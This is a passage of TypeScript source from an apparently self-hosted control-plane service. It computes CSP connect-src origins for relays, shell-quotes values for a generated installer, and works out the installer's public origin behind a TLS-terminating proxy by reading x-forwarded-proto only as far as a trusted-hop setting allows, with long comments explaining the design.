 * `REEMOAT_CP_RELAY_URL`, and a driver may build an app with none. A policy that
 * allows only `'self'` is then correct for an instance that can reach nothing
 * else.
 *
 * Leading space included so the caller concatenates rather than deciding whether
 * to.
 */
/**
 * Where a plugin's manifest and its icon are read from.
 *
 * Written down rather than derived, because it is not configuration: the
 * catalogue pins a **GitHub commit**, and this is the host that serves a file at
 * one. A second forge would arrive as a second `PluginSource.kind` on the daemon
 * and a second entry here, together — which is the shape that keeps the CSP and
 * the fetcher from disagreeing about what is reachable.
 */
const PLUGIN_MANIFEST_ORIGIN = "https://raw.githubusercontent.com";

/**
 * A configured URL's origin, or `null` for one that is absent or unparseable.
 *
 * `null` rather than a throw, `connectOrigins`' posture: this runs at app
 * construction and a driver may build an app with anything. An instance whose
 * catalogue URL is nonsense reaches no catalogue, which is both the honest policy
 * and the same one it would have had with none configured.
 */
function originOf(url: string | null): string | null {
  if (url === null || url.length === 0) return null;
  try {
    return new URL(url).origin;
  } catch {
    return null;
  }
}

function connectOrigins(relayUrl: string | null, relayUrls: Record<string, string> | null): string {
  const sources = new Set<string>();
  /*
   * ⚠ **Every relay, not just the default one.** This took `relayUrl` alone,
   * which was the whole truth while there was one — and became a blocker the
   * moment `relayUrlFor` could hand a browser somewhere else: the document is
   * served with `connect-src` naming relay-1, the token says go to relay-2, and
   * the browser refuses its own request before a byte leaves. A CSP that
   * contradicts the routing is worse than no CSP, because the failure is a
   * console message on somebody's phone.
   */
  for (const candidate of [relayUrl, ...Object.values(relayUrls ?? {})]) {
    if (candidate === null || candidate.length === 0) continue;
    let parsed: URL;
    try {
      parsed = new URL(candidate);
    } catch {
      continue;
    }
    const socket = parsed.protocol === "http:" ? "ws:" : "wss:";
    sources.add(parsed.origin);
    sources.add(`${socket}//${parsed.host}`);
  }
  return sources.size === 0 ? "" : ` ${[...sources].join(" ")}`;
}

/**
 * The one token `deploy/bootstrap.sh` reserves for this instance's address.
 *
 * Spelled once in each file, and `deploycheck` reads this constant out of here
 * and counts occurrences in the script — the same "two lists, one fact" shape
 * `.dockerignore` and the Dockerfile's COPY lines already have, except that
 * this one is checkable offline.
 */
const INSTALL_PLACEHOLDER = "@REEMOAT_CONTROL_PLANE@";

/**
 * A value as shell *data*, for the one place this service emits shell.
 *
 * The third copy of this function in the repository — `packages/web/src/
 * enrollment.ts` has one and `packages/control-plane/scripts/cpctl.ts` has one
 * — and it is a copy rather than an import because neither of those is
 * reachable from here: `packages/web` is a Vite bundle this service only
 * serves, and the Dockerfile's runtime stage carries no web `src` at all.
 *
 * What keeps three copies honest is that nothing here claims they agree.
 * `webcheck` extracts this body off disk, makes it callable, and runs all three
 * over a table of hostile URLs. The extraction finds `function shellQuote(` at
 * the top level of this file and reads to the next bare `}` in column 0 — so
 * nesting it, renaming it, or giving it an annotation the extractor cannot
 * strip makes that driver **throw** rather than quietly compare two things
 * instead of three.
 *
 * Everything inside single quotes is literal to a POSIX shell except a single
 * quote, which is closed, escaped and reopened. That arm is reachable rather
 * than defensive: an apostrophe survives `URL.origin`, measured.
 */
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", "'\\''")}'`;
}

/**
 * The origin to bake into the installer — `publicUrl`, corrected for a TLS proxy.
 *
 * ⚠ **`publicUrl` alone is wrong here, and it is wrong in production
 * specifically.** `@hono/node-server` derives the scheme from
 * `socket.encrypted`, and this service is served over plain HTTP behind a proxy
 * that terminates TLS — Traefik forwards `app.reemoat.com` to
 * `http://control-plane:7888` with `passHostHeader`. So `publicUrl` answers
 * `http://app.reemoat.com`, and **measured against the live deployment**,
 * `http://app.reemoat.com/v1/instance` answers `301` to the `https` form.
 * `bootstrap.sh` does not follow redirects — deliberately, since a redirect is
 * somebody else's idea of where the control plane is — so an installer built
 * from `publicUrl` would refuse on its very first request, on the only
 * deployment shape this feature exists for.
 *
 * `x-forwarded-proto` is the header that says so, and it is read **only as far
 * as the operator has said to trust one**: the same `trustedProxyHops` gate
 * `callerAddressOf` uses for `x-forwarded-for`, and for the same reason — the
 * header is caller-supplied, and believing it from a direct client would let
 * anybody make this route hand out an `https://` default for a plaintext
 * instance. At zero hops the header is ignored and `publicUrl` stands, which is
 * exactly the behaviour on a host with no proxy.
 *
 * ⚠ **It feeds `controlPlaneUrl` on the four code-minting routes as well, and
 * that scoping was deferred once too long.** The name is the route it was
 * written for; the question — "what origin does this service advertise for
 * itself" — is the same one those four answer. Leaving them on raw `publicUrl`
 * put `http://<host>` into the `REEMOAT_CONTROL_PLANE` of every daemon enrolled
 * through `POST /v1/machines`, into the panel's `export …` paste and into
 * `cpctl`'s. **Measured on the live deployment**: `POST` to the plaintext origin
 * answers `308`, which preserves the method and the body, so enrollment
 * succeeded anyway and the only cost was the enrollment code crossing the first
 * hop in the clear — the defect paid for itself in silence. On a deployment
 * whose plaintext port does not answer at all it is fatal instead: measured
 * against a stand where it does not, the daemon's enrollment `POST` failed at
 * the connection, `fetch failed`, every ten seconds under `KeepAlive`, and the
 * one-shot installer reported `health: FAILED after 30s` for a machine that had
 * been created and would never enroll. Behind no declared proxy nothing changes:
 * at zero hops the header is ignored and `publicUrl` stands.
 */
function installOrigin(c: Context, trustedHops: number): string {
  const base = publicUrl(c);
  if (base === "" || trustedHops <= 0) return base;
  /*
   * The entry `trustedHops` from the right, exactly as `callerAddressOf` reads
   * `x-forwarded-for`: that is the end the operator's own proxy appends to, and the
   * leftmost value is whatever the client sent. ⚠ This read the leftmost once, on
   * the reasoning that a proxy *overwrites* the header — Traefik and nginx do — but
   * one that appends leaves the client's own claim in front, and a caller could then
   * put `http` ahead of the proxy's `https` and downgrade the paste it was about to
   * receive. Self-inflicted, but the same header read two ways in one file is the
   * disagreement that gets reconciled in the wrong direction later. Fewer entries
   * than hops means the request did not come through the chain described, and
   * `publicUrl` stands.
   */
  const entries = (c.req.header("x-forwarded-proto") ?? "")
    .split(",")
    .map((entry) => entry.trim().toLowerCase())
    .filter((entry) => entry.length > 0);
  if (entries.length < trustedHops) return base;
  const forwarded = entries[entries.length - trustedHops] ?? "";
  if (forwarded !== "https" && forwarded !== "http") return base;
  return base.replace(/^https?:/, `${forwarded}:`);
}

function publicUrl(c: Context): string {
  try {
    return new URL(c.req.url).origin;
  } catch {
    return "";
  }
}

